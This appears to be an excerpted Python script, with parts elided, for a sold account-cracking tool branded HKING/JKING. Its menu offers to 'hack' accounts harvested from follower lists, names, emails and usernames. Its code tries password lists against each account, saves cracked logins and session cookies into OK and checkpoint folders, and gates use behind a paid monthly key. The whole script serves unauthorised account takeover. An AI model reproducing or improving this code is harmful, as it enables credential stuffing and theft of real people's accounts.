...
try:
    rq = requests.get('https://github.com/HemtKhan/blob/main/khan.txt').text
...
def banner():
        os.system("clear")
        os.system('echo -e "\n\x1b[1;91m___   _  ______    ___   _______  __   __  __    _  _______  \n\x1b[1;91m      # #    # ### #     #  ##### \n\x1b[1;92m      # #   #   #  ##    # #     #\n\x1b[1;92m      # #  #    #  # #   # #\n\x1b[1;91m      # ###     #  #  #  # #  ####\n\x1b[1;93m#     # #  #    #  #   # # #     # \n\x1b[1;93m#     # #   #   #  #    ## #     #\n\x1b[1;97m #####  #    # ### #     #  ##### \n\x1b[1;97m------------------------------------------------\n \n \x1b[1;93m(*)\x1b[1;95m Auther    : Hemat Khan\n \x1b[1;93m(*)\x1b[1;93m Tele        : https://t.me/HEMTHACK\n \x1b[1;93m(*)\x1b[1;95m Tool Name : HKING3\n \x1b[1;93m(*)\x1b[1;91m Github    : https://github.com/HemtKhan\n\x1b[1;97m------------------------------------------------" | lolcat')
        print("") 
...
def menu():
    ...
    psb('         %s》%s》%s》%sWELLCOME TO HKINGTOOL%s《%s《%s《'%(M,H,B,H,B,H,M))
    print('%s '%(O))
    ...
    psb('%s [%s02%s] %sHACK FROM FOLLOWER ID '%(H,P,H,B1))
    psb('%s [%s03%s] %sHACK FROM FOLLOWER ID V2'%(H,P,H,M1))
    psb('%s [%s04%s] %sHACK FROM SEARCH NAME ID    (OFF) '%(H,P,H,O1))
    psb('%s [%s05%s] %sHACK FROM MESSAGE LIST ID (OFF) '%(H,P,H,K1))
...
def dump_name(_azimvau_):
    print('%s [%s•%s] %sEXAMPLE : JKING,KANHA'%(H,P,H,K));__name__ = _cici_azimvau_('%s [%s•%s] %sENTER NAME : '%(H,P,H,K)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
...
def dump_email():
    print("%s [%s•%s] %sEXAMPLE : JKINGkanha "%(H,P,H,K));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
...
def dump_username():
    print("%s [%s•%s] %sEXAMPLE : %sJKING KANHA"%(H,P,H,K,H));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
        ...
        try:
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    files_cp = "HKING-CP/%s.txt"%(tanggal)
                    if fl.get("id") in files_cp:pass
                        ...
                        h_cp = "\r %s[%sHKING-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                    ...
                    files_ok = "HKING-OK/%s.txt"%(tanggal)
                    if fl.get("id") in files_ok:pass
                    else:
                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%sJKING-OK%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
                        else:print("\r %s[%sJKING-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
...
def result():
    ...
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            okl = os.listdir("HKING-OK");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN OK FILE %s]'%(H,P,H));print('%s '%(O))
            ...
            try:
                ppp = _azimvau_dapunta_("HKING-OK/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sJKING-OK%s] %s'%(H,P,H,yyy))
        ...
        try:
            cpl = os.listdir("HKING-CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("HKING-CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sHKING-CP%s] %s'%(K,P,K,yyy))
...
def cek_result():
    ...
    for memek in buka_baju:
        ...
        _format_ = "\r %s[%sJKING-CP%s] %s          "%(K,P,K,kontol)
...
def started():
    ...
    print('%s [%s•%s] %s[%sOK%s] IDS SAVED IN >> %sJKING-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sCP%s] IDS SAVED IN >> %sJKING-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
    psb('%s [%s•%s] %sON FLIGHT MODE FOR [5 SEC] EVERY 5 MINUTES\n'%(H,P,H,B))


def folder():
    try:os.mkdir("HKING-CP")
    except:pass
    try:os.mkdir("HKING-OK")
    except:pass
...
def genkey():
	try:
		...
		rb = rn+basesplit
		banner()
		psb('       %s》%s》%s》%s%s《%s《%s《'%(M,H,B,H,B,H,M))
		print("\n\033[0;91m     😊  ")
		print("\033[0;91m     👕     ")
		print("\033[0;91m.    👖  ")
		print("\033[0;91m.   ✋😬 ")
		print("\033[0;93m            SEND THIS KEY TO OWNER \n\n   YOUR KEY : \033[0;92m%s"%(rb))
		print("\033[0;93m   TOOL PRICE : %s100AFG"%(H))
		print("\033[0;93m: %s month"%(H))
		...
		banner()
		psb('       %s》%s》%s》%sPOWER OF JKING%s《%s《%s《'%(M,H,B,H,B,H,M))
